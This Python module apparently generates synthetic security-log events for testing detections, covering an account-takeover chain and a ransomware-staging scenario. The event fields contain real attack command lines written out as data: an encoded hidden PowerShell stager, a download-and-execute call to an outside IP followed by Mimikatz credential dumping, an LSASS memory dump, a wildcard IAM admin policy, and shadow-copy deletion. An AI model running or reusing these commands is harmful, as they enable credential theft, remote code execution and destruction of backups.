import base64
from typing import Dict, Any, List, Optional
from app.registry.entities import (
    get_user_by_username,
    get_device_for_user,
    get_suspicious_ip,
    get_primary_aws_account
)
from app.generators.entra import generate_entra_signin_event
from app.generators.powershell import (
    generate_powershell_script_block_event,
    generate_powershell_process_event
)
from app.generators.defender import (
    generate_defender_process_event,
    generate_defender_network_event,
    generate_defender_file_event
)
from app.generators.cloudtrail import generate_cloudtrail_event

def build_account_takeover_scenario(
    username: str = "david.miller",
    scenario_id: str = "SCN-001"
) -> List[Dict[str, Any]]:
    """
    Reusable function to generate a coordinated 5-stage Account Takeover & Cloud Escalation chain.
    Correlates: Entra ID -> PowerShell -> Defender -> AWS CloudTrail.
    """
    user = get_user_by_username(username) or get_user_by_username("david.miller")
    device = get_device_for_user(user["username"])
    suspicious = get_suspicious_ip(0) # 194.26.29.112 / Kyiv
    attacker_ip = suspicious["ip"]
    events = []

    # Stage 1: Entra ID - Password Spray / Brute Force (2 failed attempts)
    events.append(generate_entra_signin_event(
        user_principal_name=user["email"],
        ip_address=attacker_ip,
        app_display_name="Microsoft 365 Exchange Online",
        is_success=False,
        error_code=50126,
        failure_reason="Invalid credentials from untrusted geolocation",
        risk_level="medium",
        city=suspicious["location"].split(",")[0],
        country="UA",
        mfa_required=True,
        scenario_id=scenario_id
    ))
    events.append(generate_entra_signin_event(
        user_principal_name=user["email"],
        ip_address=attacker_ip,
        app_display_name="Microsoft 365 Exchange Online",
        is_success=False,
        error_code=50053,
        failure_reason="Account lock warning: multiple failed logins",
        risk_level="high",
        city=suspicious["location"].split(",")[0],
        country="UA",
        mfa_required=True,
        scenario_id=scenario_id
    ))

    # Stage 2: Entra ID - Compromised Credentials Success (Impossible Travel)
    events.append(generate_entra_signin_event(
        user_principal_name=user["email"],
        ip_address=attacker_ip,
        app_display_name="Microsoft 365 Exchange Online",
        is_success=True,
        error_code=0,
        failure_reason="None",
        risk_level="high",
        city=suspicious["location"].split(",")[0],
        country="UA",
        mfa_required=False,
        scenario_id=scenario_id
    ))

    # Stage 3: PowerShell - Endpoint Reconnaissance & Encoded Stager
    suspicious_encoded_cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc JAB3AGMAYQA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA..."
    events.append(generate_powershell_process_event(
        device_name=device["device_name"],
        user_name=user["username"],
        command_line=suspicious_encoded_cmd,
        parent_process="explorer.exe",
        scenario_id=scenario_id
    ))
    events.append(generate_powershell_script_block_event(
        device_name=device["device_name"],
        user_name=user["username"],
        script_text="IEX (New-Object Net.WebClient).DownloadString('http://194.26.29.112:8080/beacon.ps1'); Invoke-Mimikatz -DumpCreds",
        is_suspicious=True,
        scenario_id=scenario_id
    ))

    # Stage 4: Defender - EDR Process LSASS Access & C2 Outbound Call
    events.append(generate_defender_process_event(
        device_name=device["device_name"],
        account_name=user["username"],
        process_name="rundll32.exe",
        process_command_line="rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Temp\\lsass.dmp full",
        parent_process_name="powershell.exe",
        action_type="LsassMemoryAccessDetected",
        scenario_id=scenario_id
    ))
    events.append(generate_defender_network_event(
        device_name=device["device_name"],
        account_name=user["username"],
        remote_ip=attacker_ip,
        remote_port=8080,
        remote_url=f"http://{attacker_ip}:8080/c2-beacon",
        initiating_process="rundll32.exe",
        action_type="ConnectionSuccess",
        scenario_id=scenario_id
    ))

    # Stage 5: AWS CloudTrail - Cloud Console Login & Privilege Escalation
    aws_info = get_primary_aws_account()
    events.append(generate_cloudtrail_event(
        event_name="ConsoleLogin",
        event_source="signin.amazonaws.com",
        user_name=user["username"],
        source_ip=attacker_ip,
        request_parameters={"consoleState": "Success"},
        response_elements={"ConsoleLogin": "Success"},
        read_only=False,
        scenario_id=scenario_id
    ))
    events.append(generate_cloudtrail_event(
        event_name="PutUserPolicy",
        event_source="iam.amazonaws.com",
        user_name=user["username"],
        source_ip=attacker_ip,
        request_parameters={
            "userName": user["username"],
            "policyName": "RogueAdminEscalation",
            "policyDocument": '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
        },
        response_elements={"status": "PolicyAttached"},
        read_only=False,
        scenario_id=scenario_id
    ))

    return events

def build_ransomware_staging_scenario(
    username: str = "sarah.johnson",
    scenario_id: str = "SCN-002"
) -> List[Dict[str, Any]]:
    """
    Reusable function to generate a Ransomware Precursor & Volume Shadow Deletion scenario.
    """
    user = get_user_by_username(username) or get_user_by_username("sarah.johnson")
    device = get_device_for_user(user["username"])
    events = []

    # PowerShell deleting volume shadow copies
    events.append(generate_powershell_script_block_event(
        device_name=device["device_name"],
        user_name=user["username"],
        script_text="vssadmin.exe delete shadows /all /quiet; bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
        is_suspicious=True,
        scenario_id=scenario_id
    ))

    # Defender detecting shadow copy command execution
    events.append(generate_defender_process_event(
        device_name=device["device_name"],
        account_name=user["username"],
        process_name="vssadmin.exe",
        process_command_line="vssadmin.exe delete shadows /all /quiet",
        parent_process_name="powershell.exe",
        action_type="ProcessCreated",
        scenario_id=scenario_id
    ))

    # Defender rapid file modification in user Documents
    events.append(generate_defender_file_event(
        device_name=device["device_name"],
        account_name=user["username"],
        file_name="HR_Salaries_2026.xlsx.locked",
        folder_path=f"C:\\Users\\{user['username']}\\Documents\\",
        action_type="FileModified",
        scenario_id=scenario_id
    ))

    return events

def get_scenario_by_id(scenario_id: str) -> List[Dict[str, Any]]:
    """
    Dispatcher to retrieve scenario events by ID.
    """
    sid = scenario_id.upper()
    if sid in ("SCN-001", "SCN-ATO", "ACCOUNT_TAKEOVER"):
        return build_account_takeover_scenario(scenario_id="SCN-001")
    elif sid in ("SCN-002", "SCN-RANSOMWARE", "RANSOMWARE"):
        return build_ransomware_staging_scenario(scenario_id="SCN-002")
    return build_account_takeover_scenario(scenario_id=sid)
